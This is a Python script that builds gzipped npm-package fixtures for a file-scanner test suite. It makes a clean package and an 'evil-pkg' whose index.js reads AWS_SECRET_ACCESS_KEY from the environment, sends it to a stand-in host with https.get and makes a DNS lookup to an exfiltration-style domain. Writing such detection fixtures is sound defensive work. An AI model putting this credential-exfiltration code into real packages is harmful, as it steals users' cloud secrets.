"""Build fixture tarballs used by daemon/tests/test_shield_filescan.py.

Run once: ``python daemon/tests/fixtures/build_tarballs.py``. The tarballs are
small (~1 KB each) and committed alongside this script so the test suite has
no network dependency. Re-run after editing the fixture contents.
"""
from __future__ import annotations

import io
import os
import tarfile
from pathlib import Path

HERE = Path(__file__).parent

# ── Clean fixture: a normal utility package, no malicious patterns ────────────
CLEAN_FILES: dict[str, str] = {
    "package/package.json": '{"name":"clean-pkg","version":"1.0.0","main":"index.js"}\n',
    "package/index.js": (
        "'use strict';\n"
        "function greet(name) { return 'hello ' + name; }\n"
        "module.exports = { greet };\n"
    ),
    "package/README.md": "# clean-pkg\n\nA harmless greeting helper.\n",
}

# ── Malicious fixture: env-exfil pattern + DNS-with-long-subdomain ────────────
MALICIOUS_FILES: dict[str, str] = {
    "package/package.json": '{"name":"evil-pkg","version":"1.0.0","main":"index.js"}\n',
    # process.env reference followed by an http call within 5 lines, plus a
    # require('dns') with a 16-char random-looking subdomain on the next line.
    "package/index.js": (
        "'use strict';\n"
        "const https = require('https');\n"
        "const dns   = require('dns');\n"
        "const token = process.env.AWS_SECRET_ACCESS_KEY;\n"
        "https.get('https://collect.example.com/?t=' + token, () => {});\n"
        "dns.resolve('a8df7c1b9e2f5a3d.exfil-c2.io', () => {});\n"
        "module.exports = {};\n"
    ),
    "package/README.md": "# evil-pkg\n",
}


def build(out_path: Path, files: dict[str, str]) -> None:
    """Write a gzipped tar to *out_path* containing the given files."""
    out_path.parent.mkdir(parents=True, exist_ok=True)
    with tarfile.open(out_path, "w:gz") as tf:
        for name, content in files.items():
            data = content.encode("utf-8")
            info = tarfile.TarInfo(name=name)
            info.size = len(data)
            info.mode = 0o644
            tf.addfile(info, io.BytesIO(data))


if __name__ == "__main__":
    build(HERE / "clean-pkg-1.0.0.tgz", CLEAN_FILES)
    build(HERE / "evil-pkg-1.0.0.tgz", MALICIOUS_FILES)
    print("wrote:", *(p.name for p in HERE.glob("*.tgz")))
